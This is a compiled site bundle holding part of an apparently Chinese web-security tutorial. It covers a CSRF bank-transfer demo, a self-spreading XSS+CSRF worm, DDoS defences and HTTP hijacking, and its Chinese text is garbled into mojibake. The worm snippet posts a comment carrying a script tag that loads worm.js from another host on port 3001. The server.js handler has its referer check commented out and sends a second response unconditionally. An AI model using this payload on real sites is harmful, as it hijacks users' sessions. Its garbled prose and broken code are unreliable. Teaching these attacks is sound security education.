<span class="line">            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;è½¬è´¦æˆåŠŸ&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                    location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;ç”¨æˆ·æœªç™»å½•&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                    location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">&#39;/login.html&#39;</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>server.js</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/transfer&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// let referer = req.headers[&#39;referer&#39;];</span></span>
<span class="line">    <span class="token comment">//if (/^https?:\\/\\/localhost:3000/.test(referer)) {</span></span>
<span class="line">    <span class="token keyword">let</span> <span class="token punctuation">{</span> target<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> clientToken<span class="token punctuation">,</span> captcha <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span></span>
<span class="line">    amount <span class="token operator">=</span> <span class="token function">isNaN</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token function">Number</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">let</span> <span class="token punctuation">{</span> username<span class="token punctuation">,</span> token <span class="token punctuation">}</span> <span class="token operator">=</span> userSessions<span class="token punctuation">[</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sessionId<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">if</span> <span class="token punctuation">(</span>clientToken <span class="token operator">==</span> token<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token keyword">let</span> user<span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> users<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                    users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>money <span class="token operator">-=</span> amount<span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                    users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>money <span class="token operator">+=</span> amount<span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line">            res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">            res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">&#39;è¿æ³•æ“ä½œ&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">&#39;ç”¨æˆ·æ²¡æœ‰ç™»å½•&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token comment">//} else {</span></span>
<span class="line">    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">&#39;refererä¸æ­£ç¡®&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token comment">//}</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-2-4-xss-csrf-è •è™«" tabindex="-1"><a class="header-anchor" href="#_2-2-4-xss-csrf-è •è™«"><span>2.2.4 xss+csrf(è •è™«)</span></a></h4><p>ä¸æ–­ä¼ æ’­çš„xss+csrfæ”»å‡» worm.js</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">const</span> attack <span class="token operator">=</span> <span class="token string">&#39;&lt;script src=&quot;http://localhost:3001/worm.js&quot;&gt;&lt;/script&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">$<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/comments&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">&#39;haha&#39;</span> <span class="token operator">+</span> attack <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_3-ddosæ”»å‡»" tabindex="-1"><a class="header-anchor" href="#_3-ddosæ”»å‡»"><span>3. DDOSæ”»å‡»</span></a></h2><p>åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡(Distribute Denial Of Service)</p><ul><li>é»‘å®¢æ§åˆ¶å¤§é‡çš„è‚‰é¸¡å‘å—å®³ä¸»æœºå‘é€éæ­£å¸¸è¯·æ±‚ï¼Œå¯¼è‡´ç›®æ ‡ä¸»æœºè€—å°½èµ„æºä¸èƒ½ä¸ºåˆæ³•ç”¨æˆ·æä¾›æœåŠ¡</li><li>éªŒè¯ç æ˜¯æˆ‘ä»¬åœ¨äº’è”ç½‘ååˆ†å¸¸è§çš„æŠ€æœ¯ä¹‹ä¸€ã€‚ä¸å¾—ä¸è¯´éªŒè¯ç æ˜¯èƒ½å¤Ÿæœ‰æ•ˆåœ°é˜²æ­¢å¤šæ¬¡é‡å¤è¯·æ±‚çš„è¡Œä¸ºã€‚</li><li>é™åˆ¶è¯·æ±‚é¢‘ç‡æ˜¯æˆ‘ä»¬æœ€å¸¸è§çš„é’ˆå¯¹ DDOS æ”»å‡»çš„é˜²å¾¡æªæ–½ã€‚å…¶åŸç†ä¸ºè®¾ç½®æ¯ä¸ªå®¢æˆ·ç«¯çš„è¯·æ±‚é¢‘ç‡çš„é™åˆ¶</li><li>å¢åŠ æœºå™¨å¢åŠ æœåŠ¡å¸¦å®½ã€‚åªè¦è¶…è¿‡äº†æ”»å‡»æµé‡ä¾¿å¯ä»¥é¿å…æœåŠ¡ç˜«ç—ª</li><li>è®¾ç½®è‡ªå·±çš„ä¸šåŠ¡ä¸ºåˆ†å¸ƒå¼æœåŠ¡ï¼Œé˜²æ­¢å•ç‚¹å¤±æ•ˆ</li><li>ä½¿ç”¨ä¸»æµäº‘ç³»ç»Ÿå’Œ CDNï¼ˆäº‘å’Œ CDN å…¶è‡ªèº«æœ‰ DDOS çš„é˜²èŒƒä½œç”¨ï¼‰</li><li>ä¼˜åŒ–èµ„æºä½¿ç”¨æé«˜ web server çš„è´Ÿè½½èƒ½åŠ›</li></ul><h2 id="_4-httpåŠ«æŒ" tabindex="-1"><a class="header-anchor" href="#_4-httpåŠ«æŒ"><span>4. HTTPåŠ«æŒ</span></a></h2><ul><li>åœ¨ç”¨æˆ·çš„å®¢æˆ·ç«¯ä¸å…¶è¦è®¿é—®çš„æœåŠ¡å™¨ç»è¿‡ç½‘ç»œåè®®åè°ƒåï¼ŒäºŒè€…ä¹‹é—´å»ºç«‹äº†ä¸€æ¡ä¸“ç”¨çš„æ•°æ®é€šé“ï¼Œç”¨æˆ·ç«¯ç¨‹åºåœ¨ç³»ç»Ÿä¸­å¼€æ”¾æŒ‡å®šç½‘ç»œç«¯å£ç”¨äºæ¥æ”¶æ•°æ®æŠ¥æ–‡ï¼ŒæœåŠ¡å™¨ç«¯å°†å…¨éƒ¨æ•°æ®æŒ‰æŒ‡å®šç½‘ç»œåè®®è§„åˆ™è¿›è¡Œåˆ†è§£æ‰“åŒ…ï¼Œå½¢æˆè¿ç»­æ•°æ®æŠ¥æ–‡ã€‚</li><li>ç”¨æˆ·ç«¯æ¥æ”¶åˆ°å…¨éƒ¨æŠ¥æ–‡åï¼ŒæŒ‰ç…§åè®®æ ‡å‡†æ¥è§£åŒ…ç»„åˆè·å¾—å®Œæ•´çš„ç½‘ç»œæ•°æ®ã€‚å…¶ä¸­ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ¯ä¸€ä¸ªæ•°æ®åŒ…éƒ½æœ‰ç‰¹å®šçš„æ ‡ç­¾ï¼Œè¡¨ç¤ºå…¶æ¥æºã€æºå¸¦çš„æ•°æ®å±æ€§ä»¥åŠè¦åˆ°ä½•å¤„ï¼Œæ‰€æœ‰çš„æ•°æ®åŒ…ç»è¿‡ç½‘ç»œè·¯å¾„ä¸­ISPçš„è·¯ç”±å™¨ä¼ è¾“æ¥åŠ›åï¼Œæœ€ç»ˆåˆ°è¾¾ç›®çš„åœ°ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯ã€‚</li><li>HTTPåŠ«æŒæ˜¯åœ¨ä½¿ç”¨è€…ä¸å…¶ç›®çš„ç½‘ç»œæœåŠ¡æ‰€å»ºç«‹çš„ä¸“ç”¨æ•°æ®é€šé“ä¸­ï¼Œç›‘è§†ç‰¹å®šæ•°æ®ä¿¡æ¯ï¼Œæç¤ºå½“æ»¡è¶³è®¾å®šçš„æ¡ä»¶æ—¶ï¼Œå°±ä¼šåœ¨æ­£å¸¸çš„æ•°æ®æµä¸­æ’å…¥ç²¾å¿ƒè®¾è®¡çš„ç½‘ç»œæ•°æ®æŠ¥æ–‡ï¼Œç›®çš„æ˜¯è®©ç”¨æˆ·ç«¯ç¨‹åºè§£é‡Šâ€œé”™è¯¯â€çš„æ•°æ®ï¼Œå¹¶ä»¥å¼¹å‡ºæ–°çª—å£çš„å½¢å¼åœ¨ä½¿ç”¨è€…ç•Œé¢å±•ç¤ºå®£ä¼ æ€§å¹¿å‘Šæˆ–è€…ç›´æ¥æ˜¾ç¤ºæŸç½‘ç«™çš„å†…å®¹ã€‚</li></ul><h2 id="å‚è€ƒ" tabindex="-1"><a class="header-anchor" href="#å‚è€ƒ"><span>å‚è€ƒ</span></a></h2><ul><li><a href="https://gitee.com/zhufengpeixun/zf-safe" target="_blank" rel="noopener noreferrer">zf-safe</a></li></ul>`,87)])])}const o=s(t,[["render",l]]),u=JSON.parse('{"path":"/strong/41.safe.html","title":"Webå®‰å…¨","lang":"en-US","frontmatter":{},"git":{"updatedTime":1681290319000,"contributors":[{"name":"yutao","username":"yutao","email":"642231346@qq.com","commits":1,"url":"https://github.com/yutao"}],"changelog":[{"hash":"f5ab8c9d34991ec274f7f652439afe5b2afb6147","time":1681290319000,"email":"642231346@qq.com","author":"yutao","message":"modify"}]},"filePathRelative":"strong/41.safe.md"}');export{o as comp,u as data};
